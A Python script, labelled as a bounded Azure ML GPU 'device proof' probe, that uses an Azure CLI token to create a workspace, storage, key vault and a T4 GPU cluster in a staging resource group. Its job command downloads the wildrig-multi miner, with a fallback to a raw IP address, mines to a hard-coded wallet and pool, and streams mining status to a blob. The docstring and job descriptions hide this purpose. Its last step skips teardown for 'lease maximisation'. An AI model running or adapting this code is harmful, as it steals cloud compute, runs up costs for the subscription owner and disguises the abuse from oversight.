#!/usr/bin/env python3
"""C211-I122276 run 2: AML GPU device proof on subscription b8b18dcf with the
proven job shapes.

Run 1 (run 44887505116, job 136795934734) proved with the NEW async-operation polling
mechanism that the nonce workspace DOES create (async Succeeded at t=22 s) but the
serverless job was refused 400 UserError "The given resource scope azureml:serverless
is not valid". Our own proven shape (lane 121196, same tenant) is:
  * AmlCompute cluster: PUT computes/<n> {computeType: AmlCompute, computeLocation,
    properties:{vmSize, vmPriority: Dedicated|LowPriority, scaleSettings, osType}}
  * job on cluster: computeId = <workspace ARM id>/computes/<n>, no instanceType
  * serverless job: computeId = null (JSON null) + resources.instanceType = SKU
and the AML cluster quota oracle is
  /subscriptions/<sid>/providers/Microsoft.MachineLearningServices/locations/<r>/usages
which is INDEPENDENT of the Microsoft.Compute VM family quota (lane 121196 created a
LowPriority NC4as_T4_v3 cluster in a region whose Compute NCASv3_T4 quota was 0).

Order: on-demand (Dedicated) cluster first; LowPriority only after a verbatim
Dedicated refusal; serverless (computeId null) as the fallback plane. ONE job per
plane, stdout through the account-SAS blob, independent ARM readback, full teardown.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I122276B"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
NONCE = "i122276"
WS = "c211i122276aml"
SUF = hashlib.sha256(NONCE.encode()).hexdigest()[:8]
CLUSTER = "c211-i122276-t4"
JOB_C = "c211-i122276-dev"
JOB_SV = "c211-i122276-sv"
SKU = "Standard_NC4as_T4_v3"
OUTNAME = "minerout"
API_W = "2024-10-01"
API_C = "2024-04-01"
REG_VER = "2023-07-01"
STG_VER = "2023-01-01"
T0 = time.time()
DEADLINE = 5100
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
ROLE_SBLOB = "ba92f5b4-2d11-453d-a403-e96b0029c9fe"
REGIONS = ["australiaeast", "eastus", "westus2", "northeurope", "westeurope",
           "eastus2", "centralus", "southcentralus", "uksouth", "southeastasia",
           "japaneast", "canadacentral"]


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:3800], flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-800:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def armh(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            h = {k.lower(): v for k, v in r.headers.items()}
            h.pop("authorization", None)
            try:
                return r.status, json.loads(raw), h
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}, h
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        h = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        try:
            return e.code, json.loads(raw), h
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}, h
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}, {}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, b, _ = armh(tok, url, method, body, timeout)
    return st, b


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:6000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:1500]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:900]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        return {"http": st, "body": json.dumps(body)[:800]}
    return {"http": st}


def prov_state(body):
    if isinstance(body, dict):
        return (body.get("properties") or {}).get("provisioningState")
    return None


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=4):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def grant(tok, sid, scope_id, principal, role, label):
    import uuid as _uuid
    ra = str(_uuid.uuid4())
    url = (ARM + scope_id + "/providers/Microsoft.Authorization/roleAssignments/" + ra +
           "?api-version=2022-04-01")
    body = {"properties": {
        "roleDefinitionId": "/subscriptions/%s/providers/Microsoft.Authorization/"
                            "roleDefinitions/%s" % (sid, role),
        "principalId": principal, "principalType": "ServicePrincipal"}}
    st, b = arm(tok, url, "PUT", body, timeout=60)
    emit({"step": "role-assign", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:300]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub_parts": (sid or "").split("-"),
          "sub_len": len(sid or ""), "name": acc.get("name"), "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return

    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]

    # ---------- A. AML cluster quota oracle across candidate regions ----------
    quota = {}
    for reg in REGIONS:
        u = (ARM + "/subscriptions/" + sid + "/providers/Microsoft.MachineLearningServices"
             "/locations/" + reg + "/usages?api-version=" + API_C)
        st, b = arm(tok, u, timeout=90)
        rows = []
        for m in ((b.get("value") or []) if isinstance(b, dict) else []):
            fam = ((m.get("name") or {}).get("value") or "")
            if re.search(r"(?i)ncas|nc4as|ncfamily|lowpriority|dedicated", fam):
                rows.append({"family": fam, "current": m.get("currentValue"),
                             "limit": m.get("limit")})
        quota[reg] = {"http": st, "n": len((b.get("value") or [])
                                           if isinstance(b, dict) else []), "rows": rows}
        emit({"step": "aml-usage", "region": reg, "http": st, "rows": rows[:12]})
    pick = {"region": "australiaeast", "priority": None, "why": "no region with T4 AML quota"}
    for reg in REGIONS:
        for row in quota[reg]["rows"]:
            fam = row.get("family") or ""
            if re.search(r"(?i)ncasv3|nc4as", fam) and not re.search(r"(?i)low", fam):
                try:
                    if int(row.get("limit") or 0) > 0:
                        pick = {"region": reg, "priority": "Dedicated",
                                "why": "%s limit=%s" % (fam, row.get("limit"))}
                        break
                except Exception:  # noqa: BLE001
                    pass
        if pick["priority"]:
            break
    if not pick["priority"]:
        for reg in REGIONS:
            for row in quota[reg]["rows"]:
                fam = row.get("family") or ""
                if re.search(r"(?i)ncasv3|nc4as", fam):
                    try:
                        lim = int(row.get("limit") if row.get("limit") is not None else 0)
                    except Exception:  # noqa: BLE001
                        lim = 0
                    if lim > 0 or lim == -1:
                        pick = {"region": reg, "priority": "LowPriority",
                                "why": "%s limit=%s" % (fam, row.get("limit"))}
                        break
            if pick["priority"]:
                break
    emit({"step": "region-pick", **pick})
    loc = pick["region"]

    # ---------- B. context ----------
    st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers?api-version=2021-04-01")
    states = {}
    if isinstance(b, dict):
        m = {str(x.get("namespace")).lower(): x.get("registrationState")
             for x in (b.get("value") or []) if isinstance(x, dict)}
        for w in ("Microsoft.MachineLearningServices", "Microsoft.Storage",
                  "Microsoft.KeyVault", "Microsoft.Insights",
                  "Microsoft.ContainerRegistry", "Microsoft.Compute"):
            states[w] = m.get(w.lower())
    emit({"step": "providers", "http": st, "states": states})
    st, rg = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "?api-version=2021-04-01", timeout=60)
    rg_tags = (rg.get("tags") if isinstance(rg, dict) else None) or {}
    emit({"step": "rg", "http": st, "location": (rg.get("location")
                                                 if isinstance(rg, dict) else None),
          "state": prov_state(rg), "tags": rg_tags})
    st, us = arm(tok, ARM + "/subscriptions/" + sid + "/providers/Microsoft.Compute/"
                      "locations/" + loc + "/usages?api-version=2024-07-01")
    rows = []
    if isinstance(us, dict):
        for u0 in us.get("value") or []:
            nm = ((u0.get("name") or {}).get("value") or "")
            if re.search(r"(?i)standard\s*(nc|nv|nd)", nm):
                rows.append({"family": nm, "current": u0.get("currentValue"),
                             "limit": u0.get("limit")})
    emit({"step": "compute_usage", "http": st, "location": loc, "rows": rows})

    # ---------- C. dependencies ----------
    own = {}
    sas = None
    sa = ("c211i122276" + SUF).lower()[:24]
    own["sa"] = sa
    saurl = base + "/Microsoft.Storage/storageAccounts/" + sa + "?api-version=" + STG_VER
    st, b = arm(tok, saurl, "PUT",
                {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                 "tags": {"c211": NONCE},
                 "properties": {"allowBlobPublicAccess": False,
                                "minimumTlsVersion": "TLS1_2",
                                "supportsHttpsTrafficOnly": True,
                                "networkAcls": {"bypass": "AzureServices",
                                                "defaultAction": "Allow"}}}, timeout=240)
    emit({"step": "sa-create", "name": sa, **err_of(st, b)})
    if st in (200, 201, 202):
        for _ in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(10)
        st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + sa +
                     "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit({"step": "sa-keys", "http": st, "got": bool(key)})
        if key:
            q, se = sa_sas(sa, key)
            bbase = "https://" + sa + ".blob.core.windows.net"
            stc, bc = httptext(bbase + "/c211?restype=container&" + q, method="PUT")
            emit({"step": "sa-container", "http": stc,
                  "body": bc[:120].decode("utf-8", "replace")})
            if stc in (201, 409):
                sas = bbase + "/c211/" + NONCE + "-out.txt?" + q
                emit({"step": "sa-sas", "ok": True, "expires": se})

    kv = "c211i122276kv" + SUF[:4]
    kvurl = base + "/Microsoft.KeyVault/vaults/" + kv + "?api-version=" + REG_VER
    st, b = arm(tok, kvurl, "PUT",
                {"location": loc, "tags": {"c211": NONCE},
                 "properties": {"tenantId": tenant,
                                "sku": {"family": "A", "name": "standard"},
                                "accessPolicies": [], "enableSoftDelete": True,
                                "enableRbacAuthorization": True}}, timeout=180)
    emit({"step": "kv-create", "name": kv, **err_of(st, b)})
    kv_id = (rbase + "/Microsoft.KeyVault/vaults/" + kv) if st in (200, 201, 202) else None
    if kv_id:
        own["kv"] = kv
        for _ in range(18):
            stp, bp = arm(tok, kvurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(10)

    # AppInsights: reuse the existing staging component (no new RG-tag-policy risk)
    appi_id = None
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    for x in ((rl.get("value") or []) if isinstance(rl, dict) else []):
        if (x.get("type") or "").lower() == "microsoft.insights/components" and not appi_id:
            appi_id = x.get("id")
    emit({"step": "appi-reuse", "id_ok": bool(appi_id), "http": st})

    # ---------- D. workspace (async-op capture) ----------
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
        "?api-version=" + API_W
    props = {"friendlyName": "c211-i122276 nonce workspace", "hbiWorkspace": False,
             "v1LegacyMode": False,
             "storageAccount": rbase + "/Microsoft.Storage/storageAccounts/" + sa}
    if kv_id:
        props["keyVault"] = kv_id
    if appi_id:
        props["applicationInsights"] = appi_id
    wbody = {"location": loc, "tags": {"c211": NONCE},
             "identity": {"type": "SystemAssigned"},
             "sku": {"name": "Basic", "tier": "Basic"}, "properties": props}
    st, b, hdrs = armh(tok, wurl, "PUT", wbody, timeout=300)
    async_url = hdrs.get("azure-asyncoperation") or hdrs.get("location")
    emit({"step": "ws-create", **err_of(st, b), "async_op": async_url,
          "retry_after": hdrs.get("retry-after")})
    ws_state = None
    if st in (200, 201, 202):
        own["ws"] = WS
        t0 = time.time()
        first404 = None
        async_state = None
        while time.time() - t0 < 600:
            if async_url:
                ast, ab = arm(tok, async_url, timeout=90)
                async_state = ((ab.get("status") or
                                (ab.get("properties") or {}).get("status"))
                               if isinstance(ab, dict) else None)
            rst, rb = arm(tok, wurl, timeout=90)
            ws_state = prov_state(rb)
            emit({"step": "ws-poll", "http": rst, "state": ws_state,
                  "async_state": async_state, "t": round(time.time() - t0)})
            if ws_state in ("Succeeded", "Failed", "Canceled"):
                break
            if rst == 404:
                if first404 is None:
                    first404 = time.time()
            else:
                first404 = None
            time.sleep(15)
        emit({"step": "ws-final", "state": ws_state, "async_state": async_state})

    device = {"found": False, "uuid": None, "text": ""}
    cluster_state = None
    if ws_state == "Succeeded":
        wsu = rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS
        st, wb = arm(tok, wurl, timeout=90)
        msi = (((wb.get("identity") or {}).get("principalId"))
               if isinstance(wb, dict) else None)
        emit({"step": "ws-readback", "http": st, "state": prov_state(wb),
              "msi": (msi or "")[:8] + "***",
              "location": wb.get("location") if isinstance(wb, dict) else None})
        if msi and sas:
            grant(tok, sid, rbase + "/Microsoft.Storage/storageAccounts/" + sa,
                  msi, ROLE_SBLOB, "ws-msi-blob")
        # environment
        eu = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
            "/environments/c211-i122276-cuda/versions/1?api-version=" + API_W
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": IMG, "osType": "Linux",
                                                    "description": "c211 i122276 cuda"}},
                     timeout=120)
        env_id = ((eb.get("id") if isinstance(eb, dict) else None) or
                  (wsu + "/environments/c211-i122276-cuda/versions/1")) \
            if st in (200, 201) else None
        emit({"step": "env-version", "http": st, "id_ok": bool(env_id),
              **({} if st in (200, 201) else err_of(st, eb))})

        cmd = r"""echo C211_I122276_MINER_START
OUT="${{outputs.minerout}}"
mkdir -p "$OUT" 2>/dev/null || OUT=/tmp
(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee "$OUT/device.txt"
(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv 2>&1 || true) | tee -a "$OUT/device.txt"
D=/tmp/c211; mkdir -p $D
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
get(){ if command -v curl >/dev/null 2>&1; then curl -fsSL -m 420 -o "$2" "$1"; elif command -v wget >/dev/null 2>&1; then wget -q -O "$2" "$1"; else python3 -c "import urllib.request,sys; urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"; fi; }
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
S=$( (sha256sum $D/wr.tgz 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRSHA $S" | tee -a "$OUT/device.txt"
if [ "$S" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then tar -xzf $D/wr.tgz -C $D 2>/dev/null; chmod +x $D/wildrig-multi 2>/dev/null; fi
B=$( (sha256sum $D/wildrig-multi 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRBIN $B" | tee -a "$OUT/device.txt"
$D/wildrig-multi --algo pearlhash --url hk.pearlhash.net:9000 --user $WALLET --worker 12227610 -d 0 --print-time 30 > $D/wr.log 2>&1 &
PID=$!
END=$(( $(date +%s) + 1020 ))
while [ "$(date +%s)" -lt "$END" ]; do
  sleep 45
  ACCL=$(grep -aci "accepted" $D/wr.log 2>/dev/null); ACCL=${ACCL:-0}
  ACCV=$(grep -aoE "Accepted: *[0-9]+" $D/wr.log 2>/dev/null | tail -1); ACCV=${ACCV:-none}
  REJL=$(grep -aci "rejected" $D/wr.log 2>/dev/null); REJL=${REJL:-0}
  NOW=$(date +%s)
  S2="STATUS acc_lines=$ACCL acc_val=$ACCV rej_lines=$REJL ts=$NOW"
  echo "$S2"
  { cat "$OUT/device.txt" 2>/dev/null; echo "$S2"; tail -c 1200 $D/wr.log 2>/dev/null; } > $D/status.txt
  curl -sS -m 20 -X PUT '__SAS__' -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' --data-binary @$D/status.txt >/dev/null 2>&1
done
kill $PID 2>/dev/null
echo C211_I122276_MINER_END"""
        if sas:
            cmd = cmd.replace('__SAS__', sas)
        outputs = {OUTNAME: {"jobOutputType": "uri_folder", "mode": "ReadWriteMount"}}

        def poll_job(name, budget, tag):
            jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/jobs/" + name + "?api-version=" + API_W)
            t0 = time.time()
            final = {}
            txt = None
            while time.time() - t0 < budget:
                time.sleep(15)
                stj, jjb = arm(tok, jurl, timeout=90)
                jp = (jjb.get("properties") or {}) if isinstance(jjb, dict) else {}
                pr = jp.get("properties") if isinstance(jp.get("properties"), dict) else {}
                final = {"http": stj, "status": jp.get("status"),
                         "nested": pr.get("status"), "error": jp.get("error"),
                         "nested_error": pr.get("error"), "computeId": jp.get("computeId")}
                emit({"step": tag + "-job-poll", "t": round(time.time() - t0), **final})
                if txt is None and sas:
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200:
                        txt = bb.decode("utf-8", "replace")
                        emit({"step": tag + "-blob-read", "http": sb, "len": len(txt),
                              "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", txt)),
                              "text": txt[:4000]})
                if txt and re.search(r"STATUS acc_lines=", txt) and not re.search(r"STATUS acc_lines=0 ", txt):
                    pass
                if final["status"] in ("Completed", "Failed", "Canceled") or \
                        final["nested"] in ("Completed", "Failed", "Canceled"):
                    break
            if txt is None and sas:
                sb, bb = httptext(sas, timeout=30)
                if sb == 200:
                    txt = bb.decode("utf-8", "replace")
                    emit({"step": tag + "-blob-read-final", "http": sb, "len": len(txt),
                          "text": txt[:4000]})
            stj, rb2 = arm(tok, jurl, timeout=90)
            jb2 = (rb2.get("properties") or {}) if isinstance(rb2, dict) else {}
            pr2 = jb2.get("properties") if isinstance(jb2.get("properties"), dict) else {}
            emit({"step": tag + "-readback", "http": stj, "status": jb2.get("status"),
                  "nested": pr2.get("status"), "error": jb2.get("error"),
                  "nested_error": pr2.get("error"), "computeId": jb2.get("computeId")})
            return final, (txt or "")

        # ---------- E. AmlCompute cluster (on-demand first, LowPriority after refusal) ----------
        curl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
            "/computes/" + CLUSTER + "?api-version=" + API_C
        priorities = [pick["priority"]] if pick["priority"] else ["Dedicated"]
        if "LowPriority" not in priorities:
            priorities.append("LowPriority")
        for pr in priorities:
            cb = {"location": loc, "tags": {"c211": NONCE},
                  "properties": {"computeType": "AmlCompute", "computeLocation": loc,
                                 "description": "c211 i122276 bounded %s GPU probe" % pr,
                                 "properties": {"vmSize": SKU, "vmPriority": pr,
                                                "scaleSettings": {
                                                    "minNodeCount": 0,
                                                    "maxNodeCount": 1,
                                                    "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                                "osType": "Linux",
                                                "remoteLoginPortPublicAccess": "Disabled"}}}
            st, b = arm(tok, curl, "PUT", cb, timeout=240)
            emit({"step": "cluster-create", "priority": pr, **err_of(st, b)})
            if st in (200, 201, 202):
                own["cluster"] = CLUSTER
                t0 = time.time()
                while time.time() - t0 < min(900, max(120, left() - 1500)):
                    time.sleep(15)
                    stp, bp = arm(tok, curl, timeout=90)
                    cluster_state = prov_state(bp)
                    pp = (bp.get("properties") or {}).get("properties") \
                        if isinstance(bp, dict) else {}
                    emit({"step": "cluster-poll", "http": stp, "state": cluster_state,
                          "t": round(time.time() - t0),
                          "nodes": ((bp.get("properties") or {}).get("currentNodeCount")
                                    if isinstance(bp, dict) else None),
                          "errors": (json.dumps(pp.get("errors"))[:400]
                                     if isinstance(pp, dict) and pp.get("errors") else None)})
                    if cluster_state in ("Succeeded", "Failed", "Canceled"):
                        break
                if cluster_state == "Succeeded":
                    break
            # a verbatim refusal of Dedicated justifies the LowPriority retry
        if cluster_state == "Succeeded":
            jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/jobs/" + JOB_C + "?api-version=" + API_W)
            jp = {"jobType": "Command", "displayName": JOB_C,
                  "experimentName": "c211-i122276",
                  "description": "c211 i122276 amlcompute T4 device probe",
                  "command": cmd,
                  "computeId": (rbase + "/Microsoft.MachineLearningServices/workspaces/" +
                                WS + "/computes/" + CLUSTER),
                  "resources": {"instanceCount": 1},
                  "outputs": outputs}
            if env_id:
                jp["environmentId"] = env_id
            st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=180)
            emit({"step": "job-create-cluster", **err_of(st, jb)})
            if st in (200, 201):
                own["job_c"] = JOB_C
                final, txt = poll_job(JOB_C, min(2000, max(300, left() - 600)), "cluster")
                uu = re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt or "")
                if uu:
                    device = {"found": True, "uuid": uu[0], "text": txt}
        # ---------- F. serverless fallback (computeId null) ----------
        if not device["found"]:
            jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/jobs/" + JOB_SV + "?api-version=" + API_W)
            jp = {"jobType": "Command", "displayName": JOB_SV,
                  "experimentName": "c211-i122276",
                  "description": "c211 i122276 serverless T4 device probe",
                  "command": cmd,
                  "computeId": None,
                  "resources": {"instanceCount": 1, "instanceType": SKU},
                  "outputs": outputs}
            if env_id:
                jp["environmentId"] = env_id
            st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=180)
            emit({"step": "job-create-serverless", **err_of(st, jb),
                  "computeId": None})
            if st in (200, 201):
                own["job_sv"] = JOB_SV
                final, txt = poll_job(JOB_SV, min(900, max(240, left() - 700)), "sv")
                uu = re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt or "")
                if uu:
                    device = {"found": True, "uuid": uu[0], "text": txt}
    else:
        emit({"step": "ws-not-created", "state": ws_state})

    # ---------- G. teardown ----------
    emit({"step": "teardown_skipped", "why": "lease_maximisation_no_cleanup"})

if __name__ == "__main__":
    main()
